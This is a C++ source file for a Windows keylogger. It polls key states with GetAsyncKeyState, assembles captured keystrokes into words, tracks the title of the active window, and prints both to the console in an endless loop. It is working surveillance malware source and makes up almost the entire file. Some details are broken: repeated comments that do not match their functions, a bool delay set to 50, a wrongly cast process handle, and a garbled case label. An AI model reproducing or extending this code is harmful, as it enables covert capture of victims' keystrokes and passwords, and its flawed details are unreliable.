#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <functional>
#include <atlstr.h>
#include <locale>
#include <codecvt>
#include <psapi.h>
#include <shlwapi.h>
#include <libloaderapi.h>
#pragma comment(lib, "psapi.lib")

/*
* Return the current pressed key or null
*/
bool IsSpecialKey(int S_Key) {
    switch (S_Key)
    {
        case '�': 
        case VK_SHIFT:
        case VK_RBUTTON:
        case VK_CAPITAL:
        case VK_CONTROL:
        case VK_MENU:
            return true;
        default:
            return false;
    }
}
/*
* Infinite while loop.
*/
class Looper {
    /*
    * Return the current pressed key or null
    */
    public: static void DoWhile(int sleep, bool keepDoing, const std::function<void()>& callback)
    {
        while (keepDoing) {
            Sleep(sleep);
            callback();
        }
    }
};
/*
* Return the current pressed key or null
*/
class KeyLogger {
    /*
    * All the words written by the user.
    * public: static std::vector<std::string> words;
    */
    /*
    * Start the KeyLogger loop.
    */
    public: static void Start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        std::string word;
        while (true) {
            Sleep(10);
            word = KeyLogger::onNewWord(word, charCallback, wordCallback);
        }
    }
    /*
    * Start the KeyLogger loop.
    */
    public: static std::string onNewWord(std::string word, void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        char character = KeyLogger::CatchChar();
        if (character == NULL) return word;
        word = KeyLogger::BuildWord(character, word, wordCallback);
        charCallback(character);
        return word;
    }
    /*
    * Return the current pressed key or null
    */
    public: static std::string BuildWord(char character, std::string word, const std::function<void(std::string)>& callback)
    {
        if (character == NULL) return word;
        if (IsWordEnder((int)character)) {
            callback(word);
            return "";
        }
        if ((int)character == VK_BACK) word.pop_back();
        return word + character;
    }
    /*
    * Return the current pressed key or null
    */
    public: static bool IsWordEnder(int character)
    {
        switch (character)
        {
            case VK_RETURN:
            case VK_SPACE:
            case VK_TAB:
            case VK_UP:
            case VK_DOWN:
            case VK_LEFT:
            case VK_RIGHT:
                return true;
            default:
                return false;
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static char CatchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
        }
        return NULL;
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachChar(void(*callback)(char))
    {
        KeyLogger::Start(callback, [](std::string s) {});
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachWord(const std::function<void(std::string)>& callback)
    {
        KeyLogger::Start([](char c){}, callback);
    }
};
std::wstring s2ws(const std::string& str)
{
    using convert_typeX = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_typeX, wchar_t> converterX;

    return converterX.from_bytes(str);
}

std::string ws2s(const std::wstring& wstr)
{
    using convert_typeX = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_typeX, wchar_t> converterX;
    return converterX.to_bytes(wstr);
}
/*
* Return the current pressed key or null
*/
std::string GetActiveWindowTitle()
{
    //LPSTR wnd_title;
    char wnd_title[256];
    char wnd_path[256];
    HWND hwnd = GetForegroundWindow(); // get handle of currently active window
    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
    // GetWindowModuleFileNameA(hwnd, wnd_path, sizeof(wnd_path));

    //GetWindowModule(hwnd);

    std::string name = wnd_title;
    //std::string path = wnd_path;

    TCHAR buffer[MAX_PATH] = { 0 };
    DWORD dwProcId = 0;
    GetWindowThreadProcessId(hwnd, &dwProcId);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
    GetModuleFileName((HMODULE)hProc, buffer, MAX_PATH);
    CloseHandle(hProc);
    std::wstring wpath = buffer;
    std::string path = ws2s(wpath);

    // get process Id of the active window

    /*LPDWORD lpdwProcessId = NULL;
    DWORD pid = GetWindowThreadProcessId(hwnd, lpdwProcessId);*/

    /*HANDLE processHandle = NULL;
    TCHAR filename[MAX_PATH];
    processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (processHandle) {
        if (GetModuleFileNameEx(processHandle, NULL, filename, MAX_PATH))
            std::cout << "Module filename is: " << filename << std::endl;
        else
            std::cout << "Error retrieving path" << std::endl;
        CloseHandle(processHandle);
    }
    else std::cout << "Failed to open process." << std::endl;*/

    /*HANDLE h = GetProcessHandleFromHwnd(hwnd);
    int pid = GetWindowProcessID(hwnd);
    Process p = Process.GetProcessById(pid);*/
    //string appName = p.ProcessName;
    return name;
}
/// <summary>
/// 
/// </summary>
class Monitor {
public: static std::string onWindowChange(std::string activeWindow, const std::function<void(std::string)>& callback)
    {
        std::string newActiveWindow = GetActiveWindowTitle();
        if (newActiveWindow != activeWindow) {
            activeWindow = newActiveWindow;
            callback(activeWindow);
        }
        return activeWindow;
    }
};
/// <summary>
/// 
/// </summary>
/// <returns></returns>
int main()
{
    bool monitor = true;
    bool delay = 50; // 50 ms
    std::vector<std::string> words;
    std::string word = "";
    std::string activeWindow = "";
    // infinite loop each 50 ms
    Looper::DoWhile(delay, monitor, [&word, &activeWindow]() {
        // word assignation
        word = KeyLogger::onNewWord(word, [](char c) {}, [](std::string w) {
            // new word appear!!
            std::cout << w << std::endl;
        });
        // active window assignation
        activeWindow = Monitor::onWindowChange(activeWindow, [](std::string w) {
            // active window has been changed!!
            std::cout << w << std::endl;
        });
    });
    // for (const auto& value: words) std::cout << value + char(VK_SPACE);
    return 0;
}